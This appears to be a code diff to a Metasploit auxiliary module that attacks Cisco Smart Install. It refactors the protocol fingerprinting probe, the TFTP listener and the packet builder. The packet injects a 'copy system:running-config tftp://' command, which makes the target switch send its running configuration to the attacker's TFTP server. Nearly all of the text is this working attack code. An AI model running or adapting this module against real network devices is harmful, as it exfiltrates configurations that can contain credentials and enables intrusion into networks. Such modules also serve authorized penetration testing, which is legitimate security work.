@@ -48,18 +48,29 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def start_tftp(req_type)
+  # thanks to https://github.com/Cisco-Talos/smi_check/blob/master/smi_check.py#L52-L53
+  SMI_PROBE = "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00".freeze
+  SMI_RE = /^\x00{3}\x04\x00{7}\x03\x00{3}\x08\x00{3}\x01\x00{4}$/
+  def smi?
+    sock.puts(SMI_PROBE)
+    response = sock.get_once(-1)
+    if response
+      if SMI_RE.match(response)
+        print_good("Fingerprinted the Cisco Smart Install protocol")
+        return true
+      else
+        vprint_status("No match for '#{response}'")
+      end
+    else
+      vprint_status("No response")
+    end
+  end
+
+  def start_tftp
     print_status("Starting TFTP Server...")
     @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
-    case
-      when req_type == "PUT"
-        @tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }
-        @tftp.start
-      when req_type == "GET" # in progress of writing "UPLOAD" function
-        config = @config.read(@config.stat.size)
-        @tftp.register_file("#{Rex::Text.rand_text_alpha}.conf", config)
-        @tftp.start
-    end
+    @tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }
+    @tftp.start
     add_socket(@tftp.sock)
     @main_thread = ::Thread.current
   end
@@ -83,6 +94,7 @@ class MetasploitModule < Msf::Auxiliary
   # Callback for incoming files
   #
   def process_incoming(info)
+    @config_recieved = true
     return if not info[:file]
     name = info[:file][:name]
     data = info[:file][:data]
@@ -101,30 +113,12 @@ class MetasploitModule < Msf::Auxiliary
     string.scan(/../).map { |x| x.hex }.pack('c*')
   end
 
-  def craft_packet
+  def send_packet
     copy_config = "copy system:running-config tftp://#{@lhost}/#{Rex::Text.rand_text_alpha(8)}"
     packet_header = '00000001000000010000000800000408000100140000000100000000fc99473786600000000303f4'
     packet = (decode_hex(packet_header) + copy_config + decode_hex(('00' * (336 - copy_config.length)))) + (decode_hex(('00' * (336)))) + (decode_hex(('00' * 336)))
-    return packet
-  end
-
-
-  # thanks to https://github.com/Cisco-Talos/smi_check/blob/master/smi_check.py#L52-L53
-  SMI_PROBE = "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00".freeze
-  SMI_RE = /^\x00{3}\x04\x00{7}\x03\x00{3}\x08\x00{3}\x01\x00{4}$/
-  def smi?
-    sock.puts(SMI_PROBE)
-    response = sock.get_once(-1)
-    if response
-      if SMI_RE.match(response)
-        print_good("Fingerprinted the Cisco Smart Install protocol")
-        return true
-      else
-        vprint_status("No match for '#{response}'")
-      end
-    else
-      vprint_status("No response")
-    end
+    print_status("Requesting configuration from device...")
+    sock.put(packet)
   end
 
   def run_host(ip)
@@ -135,17 +129,15 @@ class MetasploitModule < Msf::Auxiliary
           connect
           return unless smi?
         when action.name == 'DOWNLOAD'
-          start_tftp("PUT")
+          start_tftp
           connect
           return unless smi?
           disconnect # cant send any additional packets, so closing
           connect
           print_status("Waiting #{datastore['DELAY']} seconds before requesting config")
-          Rex.sleep(datastore['DELAY']) 
-          packet = craft_packet
-          print_status("Requesting configuration from device...")
+          Rex.sleep(datastore['DELAY'])
+          send_packet
           print_status("Waiting #{datastore['SLEEP']} seconds for configuration")
-          sock.put(packet)
           Rex.sleep(datastore['SLEEP'])
       end
     rescue Rex::AddressInUse, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, \
